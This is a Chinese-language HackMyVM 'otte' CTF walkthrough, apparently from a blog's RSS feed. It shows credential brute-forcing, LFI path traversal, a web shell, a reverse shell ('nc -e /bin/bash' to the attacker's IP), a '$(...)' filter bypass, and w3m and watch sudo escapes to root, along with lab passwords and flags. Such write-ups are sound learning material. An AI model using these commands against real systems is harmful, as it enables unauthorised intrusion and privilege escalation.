┌──(root㉿kali)-[~/Desktop/hmv/otte]
└─# cat note.txt
Hi thomas ! I put on you personal folder the php code you asked me !

See you later +++

<br>这里获取到了一个用户 thomas 而且告诉我们他的文件夹里面有一个PHP文件<br><br>网站需要验证身份<br>注意由于这个靶机有点老，而且是老外出的。所以这里的提示框会缺失提示信息，<br>
需要用老版本的浏览器才能显示<br>这里给大家分享一个浏览器，用这个浏览器就会显示提示信息<br>
<a rel="noopener nofollow" class="external-link" href="https://www.playbook.com/s/yurain/au1fnEHuEk3DvD7zKVV4K9d8" target="_blank">https://www.playbook.com/s/yurain/au1fnEHuEk3DvD7zKVV4K9d8</a><br>
访问网站会给我们提示 “Siemens - Root authentification”<br>
<img alt="Pasted image 20241228123243" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241228123243.png" referrerpolicy="no-referrer"><br>
那这里很可能就是西门子设备的默认账号密码<br>
常见的设备账面密码可以在<a data-tooltip-position="top" aria-label="https://forum.ywhack.com/password.php" rel="noopener nofollow" class="external-link" href="https://forum.ywhack.com/password.php" target="_blank">这里</a>查询(国内的比较全，西门子的我试了一下 这里面没有正确的)<br>
后面在这里获取到了一个常用的西门子默认账号密码表<br>
<a rel="noopener nofollow" class="external-link" href="https://www.192-168-1-1-ip.co/router/siemens/siemens/17622/" target="_blank">https://www.192-168-1-1-ip.co/router/siemens/siemens/17622/</a><br><br>burp爆破一下就能获取到密码，这里要对payload进行base64编码<br>
<img alt="Pasted image 20241228130727" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241228130727.png" referrerpolicy="no-referrer"><br>
解码后的密码 root:zP2wxY4uE<br>
登录成功后会获取到一张图片<br>
<img alt="Pasted image 20241228131103" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241228131103.png" referrerpolicy="no-referrer"><br>
图片并没有隐藏什么信息<br><br>这里爆破命令也需要进行Basic认证<br>┌──(root㉿kali)-[~/Desktop/hmv/otte]
└─# gobuster dir -U root -P zP2wxY4uE -u http://192.168.56.27 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.27
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Auth User:               root
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 28]
/image                (Status: 200) [Size: 47076]
/config.php           (Status: 200) [Size: 0]
/thinkgeek.php        (Status: 200) [Size: 28]
<br>获取到了一个路径 thinkgeek.php，访问后还是首页的那张照片<br>┌──(root㉿kali)-[~/Desktop/hmv/otte]
└─# curl http://192.168.56.27/thinkgeek.php -H "Authorization: Basic cm9vdDp6UDJ3eFk0dUU"
&lt;img src="image.jpg" alt=""&gt;     
<br><br>使用arjun爆破出参数 file<br>┌──(root㉿kali)-[~/Desktop/hmv/otte]
└─# arjun -u http://192.168.56.27/thinkgeek.php --headers "Authorization: Basic cm9vdDp6UDJ3eFk0dUU"
    _
   /_| _ '
  (  |/ /(//) v2.2.7
      _/

[*] Scanning 0/1: http://192.168.56.27/thinkgeek.php
[*] Probing the target for stability
[*] Analysing HTTP response for anomalies
[*] Logicforcing the URL endpoint
[✓] parameter detected: file, based on: body length
[+] Parameters found: file

<br>根据参数就能猜测出这里大概率是一个LFI<br>┌──(root㉿kali)-[~/Desktop/hmv/otte]
└─# curl http://192.168.56.27/thinkgeek.php?file=../../../../../../etc/passwd -H "Authorization: Basic cm9vdDp6UDJ3eFk0dUU"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
thomas:x:1000:1000:thomas,,,:/home/thomas:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false
proftpd:x:107:65534::/run/proftpd:/usr/sbin/nologin
ftp:x:108:65534::/srv/ftp:/usr/sbin/nologin
laetitia:x:1001:1001:,,,:/home/laetitia:/bin/bash
cedric:x:1002:1002:,,,:/home/cedric:/bin/bash

<br>测试出来也是一个LFI <br>然后尝试读取私钥但是没有权限。<br>
根据提示告诉我们 thomas 用户目录下有一个php文件很重要，我们将其爆破出来<br>┌──(root㉿kali)-[~/Desktop/hmv/otte]
└─# ffuf -u http://192.168.56.27/thinkgeek.php?file=../../../../../../home/thomas/FUZZ.php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H "Authorization: Basic cm9vdDp6UDJ3eFk0dUU" |grep -v "Size: 0"

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.27/thinkgeek.php?file=../../../../../../home/thomas/FUZZ.php
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Header           : Authorization: Basic cm9vdDp6UDJ3eFk0dUU
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

shell                   [Status: 200, Size: 20, Words: 3, Lines: 3, Duration: 11ms]



<br>发现一个 shell.php <br>┌──(root㉿kali)-[~/Desktop/tools]
└─# curl http://192.168.56.27/thinkgeek.php?file=../../../../../../../home/thomas/shell.php -H "Authorization: Basic cm9vdDp6UDJ3eFk0dUU"
Have fun !&lt;br&gt;&lt;br&gt;
<br>爆破一下参数<br>┌──(root㉿kali)-[~/Desktop/hmv/otte]
└─# ffuf -u "http://192.168.56.27/thinkgeek.php?file=../../../../../../home/thomas/shell.php&amp;FUZZ=whoami"  -w /usr/share/wordlists/parameter.txt -H "Authorization: Basic cm9vdDp6UDJ3eFk0dUU" |grep -v "Size: 20"

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.27/thinkgeek.php?file=../../../../../../home/thomas/shell.php&amp;FUZZ=whoami
 :: Wordlist         : FUZZ: /usr/share/wordlists/parameter.txt
 :: Header           : Authorization: Basic cm9vdDp6UDJ3eFk0dUU
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

file                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 3ms]
command                 [Status: 200, Size: 29, Words: 3, Lines: 4, Duration: 398ms]
:: Progress: [5846/5846] :: Job [1/1] :: 956 req/sec :: Duration: [0:00:06] :: Errors: 0 ::

<br>注意这里由于前面已经使用了一个参数file了，要爆破另外一个参数只能用&amp;<br>
而且arjun好像不能爆破双参数的这种。这里我选择用ffuf爆破<br>爆破出参数是 command<br>┌──(root㉿kali)-[~/Desktop/hmv/otte]
└─# curl "http://192.168.56.27/thinkgeek.php?file=../../../../../../../home/thomas/shell.php&amp;command=whoami" -H "Authorization: Basic cm9vdDp6UDJ3eFk0dUU"
Have fun !&lt;br&gt;&lt;br&gt;

www-data

<br>然后反弹shell即可<br>┌──(root㉿kali)-[~/Desktop/hmv/otte]
└─# pwncat-cs -lp 1234

[01:15:41] Welcome to pwncat 🐈!                                                                  __main__.py:164
[01:17:04] received connection from 192.168.56.27:44386                                                bind.py:84
[01:17:04] 192.168.56.27:44386: registered new host w/ db                                          manager.py:957
(local) pwncat$
(remote) www-data@otte:/var/www/html$ whoami
www-data
<br><br><br>在 thomas 目录下有一个提示<br>(remote) www-data@otte:/home/thomas$ cat nightmare.txt
who is the son of a bitch who replaced the signature on my file with fucking XXX?! I need to find the original signature!

<br>
翻译：是谁这个混蛋把我文件的签名替换成了该死的 XXX？！我需要找到原来的签名！
<br>意思是我们要恢复一个文件的签名,而这个文件就是同目录下的 important_file<br>(remote) www-data@otte:/home/thomas$ head important_file
00000000: XXXXXXXXXXXXXXXX 0000 000d 4948 4452  .XXX........IHDR
00000010: 0000 012c 0000 012c 0806 0000 0079 7d8e  ...,...,.....y}.
00000020: 7500 0000 1b74 4558 7443 7265 6174 696f  u....tEXtCreatio
00000030: 6e20 5469 6d65 0031 3632 3130 3037 3337  n Time.162100737
00000040: 3935 3239 15fc b9e2 0000 37e9 4944 4154  9529......7.IDAT
00000050: 78da ed9d 8bab 7ecf 55de f38f 168a 2085  x.....~.U..... .
00000060: 2214 410a 2208 2294 8214 4428 8582 286a  ".A."."...D(..(j
00000070: bd50 898a d6b6 62b0 28a2 a849 9a18 a3b9  .P....b.(..I....
00000080: 7889 a931 3626 8d9a 8ba6 8947 3e5f ddb8  x..16&amp;.....G&gt;_..
00000090: ddee 99f5 ccac 35b3 67ef 773d 3090 7c7f  ......5.g.w=0.|.

<br>可以发现签名的文件头变成了XXXX<br>
但是经常玩CTF 杂项的师傅肯定就可以发现第一行有一个 IHDR 这个经常在Png图片里面出现<br>
然后只需要找一个png图片提取出它前面的16进制替换掉即可<br>
8950 4E47 0D0A 1A0A<br>
然后导出即可<br>
<img alt="Pasted image 20241228143249" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241228143249.png" referrerpolicy="no-referrer"> <br>导出后可以得到一张二维码<br>
<img alt="download" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/download.png" referrerpolicy="no-referrer"><br>
解析后获取到一个网站 <a rel="noopener nofollow" class="external-link" href="https://eqrcode.co/a/SVxQdM" target="_blank">https://eqrcode.co/a/SVxQdM</a><br>
访问网站可以获取到thomas账户的密码 thomas:youareonthegoodwaybro<br><br>thomas@otte:~$ sudo -l
Matching Defaults entries for thomas on otte:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User thomas may run the following commands on otte:
    (laetitia) NOPASSWD: /usr/bin/python3 /home/laetitia/simpler.py *

<br><br>观察代码在 exec_ping 处发现了可以利用的地方<br>thomas@otte:~$ cat /home/laetitia/simpler.py
...
def exec_ping():
    forbidden = ['&amp;', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)

<br>这里没有过滤 $ ，导致我们可以使用 命令替换语法$(...) 进行绕过<br>
我们先写一个反弹shell的脚本<br>thomas@otte:/tmp$ echo 'nc -e /bin/bash 192.168.56.6 2233' &gt;shell.sh
<br>然后执行脚本反弹shell实现提权<br>thomas@otte:/tmp$ sudo -u laetitia /usr/bin/python3 /home/laetitia/simpler.py -p
***********************************************
     _                 _
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/
                                @ironhackers.es

***********************************************

Enter an IP: $(bash /tmp/shell.sh)

<br>┌──(root㉿kali)-[~/Desktop/hmv/otte]
└─# pwncat-cs -lp 2233

(local) pwncat$
(remote) laetitia@otte:/tmp$ whoami
laetitia

<br><br>(remote) laetitia@otte:/tmp$ sudo -l
Matching Defaults entries for laetitia on otte:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User laetitia may run the following commands on otte:
    (cedric) NOPASSWD:  

<br><img alt="Pasted image 20241228150404" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241228150404.png" referrerpolicy="no-referrer"><br>
这里有一个文件读取，<br>
但是w3m的交互模式是可以执行命令的<br>
利用交换模式提权即可<br>(remote) laetitia@otte:/home/laetitia/.w3m$ sudo -u cedric /usr/bin/w3m "/etc/passwd"
进去后 执行 ！bash
cedric@otte:/home/laetitia/.w3m$ whoami
cedric

(remote) cedric@otte:/home/cedric$ cat user.txt
e1e4e2e00a00df7b40c5436155ab4996
<br><br>进来后有一个id_rsa<br>(remote) cedric@otte:/home/cedric$ ls
id_rsa  user.txt
<br>发现是root的私钥<br>┌──(root㉿kali)-[~/Desktop/hmv/otte]
└─# chmod 600 id_rsa

┌──(root㉿kali)-[~/Desktop/hmv/otte]
└─# ssh-keygen -y -f id_rsa
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzc3fvk0OLTl7Mx2VF6cr9A6AfAIV05BjNmrBnJ+lxNtP4fYzYjnvxNDtv3lbeLHsyuZD6C29nPCpvi7hUdX5tjjt5e8aFcH5Wtu1zOouXjs8RV6tCUBp433igqXwbVl1WKeQ7vYO+yuqBBacJNkXPU0e0ROwXBFWDklOYwSvnRW6Yi3VK7MQueQgP+3+ajLnwpmpOxndi3hCNwOppUlDNhEm6f8rJ4zatAXPP5SMIp6/P3c98Qjn0zHdkI7t3kL6HU5uGwQsQi3WJGz18YavwyjXHSlQLlwhTDGgOSQ6zpx4WJ7iY7mK/dL1c7CNoF115rpgqHyFJQCdlvsgIJ9jN root@otte
<br>直接ssh上去即可<br>root@otte:~# cat root.txt
84decf19261819687b63c8210cd28f7c
<br><br>(remote) cedric@otte:/home/cedric$ sudo -l
Matching Defaults entries for cedric on otte:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cedric may run the following commands on otte:
    (ALL : ALL) NOPASSWD: /usr/bin/mmwatch

<br>mmwatch 实际上就是一个python脚本，他调用了 watch 程序，我们可以利用 watch 的提权方式用它进行提权<br>
<img alt="Pasted image 20241228152217" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241228152217.png" referrerpolicy="no-referrer"><br>sudo -u root mmwatch  -x "sh -c 'reset; exec sh 1&gt;&amp;0 2&gt;&amp;0'"
(remote) root@otte:/home/cedric$ id
uid=0(root) gid=0(root) groups=0(root)

]]></description><link>https://www.c1trus.top/24-渗透/hmv/49.otte.html</link><guid isPermaLink="false">24-渗透/HMV/49.otte.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Sat, 28 Dec 2024 15:12:25 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241228123243.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241228123243.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Home]]></title><description><![CDATA[ 
 <br>continue...<br><br><br><br><br><br><br>...]]></description><link>https://www.c1trus.top/40-obsidian/home.html</link><guid isPermaLink="false">40-Obsidian/Home.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Sat, 28 Dec 2024 14:38:49 GMT</pubDate></item></channel></rss>